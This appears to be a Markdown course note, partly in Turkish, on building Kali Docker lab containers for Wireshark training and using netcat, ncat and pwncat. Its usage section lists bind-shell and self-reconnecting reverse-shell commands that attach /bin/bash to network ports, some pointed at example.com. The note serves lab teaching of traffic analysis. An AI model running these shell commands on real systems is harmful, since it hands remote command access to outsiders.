# NCAT

Use it in wireshark training

##  Introduction

Sniffing, tracing and protocol analysis kursundaki örnekleri netcat ile zenginleştirmek için notlar aldım.

netcat için farklı versiyonlar var. Kali ile gelen versiyon traditional versiyon. Biz _**[ncat](https://nmap.org/ncat/)**_ versiyonunu kullanacağız. nmap için tekrar güncellenmiş. Ayrıca bir _**openbsd**_ versiyonu var. Birde _**[pwncat](https://pwncat.org)**_ versiyonu var.

## Preparing the environment (old)

Two kali docker images running on docker desktop on two Macbook Pro's were used.The dockerfile used to build these images is [Dockerfile-kali](./../Moved/dockerfiles/Dockerfile-kali).

```bash
docker build ./ -f Dockerfile-kali
```

| Image | Description |
| ------ | ----------- |
| kali-rolling-updated | Kali headless+large manually build with the command **docker commit d3c823bbd38c bbmorten/kali-rolling-updated** |
| kali-rolling-updated:v4 | Kali headless+large manually build with the command **docker commit -c "EXPOSE 5900" 3291958fccfa bbmorten/kali-rolling-updated:v4** |
| kali-rolling-updated:v5 | Kali headless+large manually build with the command **docker commit -c "EXPOSE 5900-5901" 3291958fccfa bbmorten/kali-rolling-updated:v5** |
| kali-rolling-updated:v6 | Kali headless+large manually build with the command **docker commit --change "ENV USER=root" --change='CMD ["sh","-c","vncserver :0 -geometry 2048x1280 -depth 16 -pixelformat rgb565"]' -c "EXPOSE 5900-5910" 2e0ab961edd5 bbmorten/kali-rolling-updated:v7** |

v7 olmadı. Execute edip çıkıyor. v5 ile devam.

## Preparing the environment (New)

Use the following docker-compose file

```yaml
services:
  kali1:
    image: bbmorten/kali-rolling-updated:v5
    container_name: kali1
    networks:
      kali_net1:
        ipv4_address: 172.16.238.10
    expose:
      - "5900"
      - "5901"
    ports:
      - "25900:5900"
      - "25901:5901"
    tty: true
    stdin_open: true
    privileged: true

  kali2:
    image: bbmorten/kali-rolling-updated:v5
    container_name: kali2
    networks:
      kali_net2:
        ipv4_address: 172.16.239.10
    expose:
      - "5900"
      - "5901"
    ports:
      - "25910:5900"
      - "25911:5901"
    tty: true
    stdin_open: true
    privileged: true

  middlehost:
    image: ubuntu:latest
    container_name: middlehost
    networks:
      kali_net1:
        ipv4_address: 172.16.238.20
      kali_net2:
        ipv4_address: 172.16.239.20
    tty: true
    stdin_open: true
    privileged: true

networks:
  kali_net1:
    driver: bridge
    ipam:
      config:
        - subnet: 172.16.238.0/24
  kali_net2:
    driver: bridge
    ipam:
      config:
        - subnet: 172.16.239.0/24

```

## Kali Desktop

### Links

- [Kali Desktop 1](https://dog.wtf/tech/run-kali-in-docker-and-install-desktop-environment-and-vnc/)
- [Kali Desktop 2](https://hub.docker.com/r/lukaszlach/kali-desktop/)

### Kali Desktop'a VNC ile bağlanmak için

```bash

apt-get install kali-desktop-xfce
vncpasswd
export USER=root
tightvncserver :0 -geometry 2048x1280 -depth 16 -pixelformat rgb565

```

To kill and restart again the VNC server:

```bash
tightvncserver -kill :0
```

### Kali Desktop'a web browser ile bağlanmak için

```bash
apt-get install net-tools
apt-get install novnc
#/usr/share/novnc/utils/launch.sh --listen 5901 --vnc localhost:5900
novnc_proxy --vnc localhost:5901 --listen localhost:5900
http://localhost:25901/vnc.html?host=192.168.65.1&port=25901
```

##  Usage examples

### TCP Bind shell

Default TCP bind shell listening on :4444 which behaves exactly as nc.

```bash
pwncat -l -e '/bin/bash' 4444
```

The following TCP bind shell will re-accept new clients as soon as a client has disconnected

```bash
pwncat -l -e '/bin/bash' 4444 -k
```

### TCP Reverse shell

Default TCP reverse shell connecting to example.com:4444 which behaves exactly as nc.

```shell
pwncat -e '/bin/bash' example.com 4444
```

The following is a Ctrl+c proof TCP reverse shell. If you stop your local listener, the reverse shell will automatically connect back to you indefinitely.

```shell
pwncat -e '/bin/bash' example.com 4444 --reconn --recon-wait 1
```

Use simply

```bash
pwncat 192.168.68.107 4444
```

### Redirecting output or enabling shell access

Bind to TCP port 8081 and attach /bin/bash for the world to access freely.

```bash
ncat --exec "/bin/bash" -l 8081 --keep-open
```

### Redirecting port 8082 to port 80

Redirect TCP port 8082 on the local machine to host on port 80.

```bash
ncat --sh-exec "ncat example.org 80" -l 8080 --keep-open
```

### Limiting the number of connections and access

Bind a shell to TCP port 8081, limit access to hosts on a local network, and limit the maximum number of simultaneous connections to 3.

```bash
ncat --exec "/bin/bash" --max-conns 3 --allow 192.168.0.0/24 -l 8081 --keep-open
```
